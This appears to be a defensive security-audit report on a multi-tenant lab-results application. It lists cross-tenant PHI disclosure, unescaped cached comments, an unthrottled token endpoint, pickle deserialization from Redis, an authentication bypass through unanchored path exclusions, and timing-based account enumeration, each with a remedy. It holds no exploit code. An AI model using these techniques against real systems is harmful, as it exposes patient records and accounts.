scope.narrowed_by: Narrowed by the BearerAuth middleware (app.py:22), which requires a valid token for this path, and by the service account's own filesystem permissions.

findings.title: Panel history endpoint returns results across every organisation
findings.class: Broken access control / cross-tenant PHI disclosure
findings.evidence: recent_by_panel filters on `panel_code = $1` and nothing else (lines 52-56) - there is no ordering_org predicate, unlike its sibling results_for_patient (line 39) and delete_result (line 115). Its controller, recent_for_panel (results.py:42-49), never touches `request.scope['user']` at all: the handler does not even take the request. The rows it selects include id, patient_id, value_json and comment (line 52).

The returned result ids also feed the cached-report disclosure, since ids for other organisations are exactly what that finding needs.
findings.recommendation: Add `AND ordering_org = $2` to the statement and pass the caller's org_id from the controller, matching results_for_patient.

triage.reason: Ingress cited: results.py:45 `panel_code: str` bound from the URL of GET /api/v1/results/panel/{panel_code}/recent; the disclosure follows from the caller reaching the endpoint at all.
Verified that the WHERE clause at store.py:54 has a single predicate and that results.py:43-49 accepts no Request parameter.
A missing tenancy predicate on a PHI query is an access-control defect, not missing hygiene.
Neither file is in a test, mock or experimental path.

findings.title: Clinician comment is rendered unescaped and the bulk-import path never sanitises it

Because the rendered HTML is then cached in Redis (render.py:49-50) and served to other organisations by the cache-ordering defect, one injected comment reaches viewers beyond the attacker's own organisation.

findings.title: Rate limiting is disabled on the credential-verifying token endpoint
findings.evidence: The rate limiter excludes `/api/v1/oauth` (line 29), which is the mount point of TokenController (tokens.py:38) and therefore covers /api/v1/oauth/token - the only endpoint that verifies operator credentials. A successful guess yields a token carrying the operator's org_id and role, including lab_admin.
findings.recommendation: Apply a separate, stricter limiter keyed on client_id plus source address to the token route, and add per-account failure counting with temporary lockout. Exclude only the refresh path if refresh storms are the real concern.

Brute-force protection on the sole credential endpoint is a primary authentication control rather than defence-in-depth hygiene.
Exclusion list at app.py:29 and the controller mount at tokens.py:38 verified.
argon2 raises the per-guess cost but is not a rate limit, so it does not close this.

scope.narrowed_by: Narrowed by the argon2 verification cost at tokens.py:54, which slows each attempt but imposes no cap on the number of attempts.

findings.title: Untrusted deserialization of cached panel definitions
findings.evidence: cached_panel_definition fetches a value from Redis and passes it straight to `pickle.loads` (lines 124-127). pickle executes arbitrary constructors during unpickling, so the Redis value is effectively code. The companion writer store_panel_definition pickles on the way in (line 131). The comment explains the choice was made to preserve Decimal reference ranges and a unit registry.

That includes an attacker who reaches Redis directly (settings.py:16 defaults to an unauthenticated localhost instance with no password in the URL) and any other service sharing that database.
findings.recommendation: Serialise the definitions as JSON with an explicit codec for Decimal and the unit registry, and drop pickle entirely. If pickle must stay, keep the blobs in a store only this service can write and authenticate them with an HMAC before loading.

No HTTP ingress reaches this function in the snapshot - neither cached_panel_definition nor store_panel_definition has a caller here - so the untrusted writer is the Redis instance itself rather than a request path I can cite by file:line.
pickle is not a safe standard-library parser being used without paranoia; json.loads is used correctly elsewhere in the same module (line 83).
Both functions, the import at line 6 and the redis URL default at settings.py:16 verified.

findings.title: Authentication and rate-limit exclusions are unanchored substring patterns
findings.evidence: Both the auth middleware and the limiter are given bare exclusion strings - `exclude=['/health', '/api/v1/oauth']` (lines 22, 29). Litestar compiles a middleware exclude list into a single regular expression and tests it against the request path without anchoring it to the start of the path, so the exclusion is satisfied by any path that merely contains one of those substrings. The application exposes one route whose parameter accepts separators and can therefore place an arbitrary substring inside the path: `/attachments/{name:path}` (reports.py:35).
findings.impact: A request whose captured `{name:path}` value embeds `/health` produces a full path containing that substring and skips BearerAuth entirely, turning the authenticated arbitrary-file-read finding on that same handler into an unauthenticated one. The same substring trick removes the rate limiter from any route it can be applied to.
findings.recommendation: Anchor the patterns explicitly - `'^/health$'` and `'^/api/v1/oauth'` - or, better, use Litestar's `exclude_from_auth` handler opt (already used correctly for the health route at app.py:38) instead of path patterns.

triage.reason: The cited lines and the `{name:path}` converter at reports.py:35 are verified in the snapshot; what is not verified is the framework's matching semantics.

Litestar is not installed in this offline environment, so I could not execute the exclusion matcher to confirm it searches rather than anchors. Reported as probable on that basis, and the severity reflects the unverified step.
Ingress cited: reports.py:36 `name: str` from the `{name:path}` URL segment is the attacker-controlled text that would be spliced into the matched path.
The claim is a bypass of the authentication middleware, not a missing hardening measure.

findings.title: Operator enumeration through the token endpoint's asymmetric verification path
findings.evidence: When the operators lookup returns no row the handler raises immediately (lines 50-51) without performing any password verification. The two failures are therefore indistinguishable in content but differ by the full argon2 cost in latency.

The absence of any rate limiting on this route makes collecting enough samples to separate the two distributions straightforward.
findings.recommendation: Verify against a fixed dummy argon2 hash when no row is found, so both branches perform the same work before returning the same error.

Both branches and the shared error detail string verified at lines 50-56.
argon2 is the right primitive and is used correctly; the finding is the branch that skips it entirely.
No resource-exhaustion claim is made.
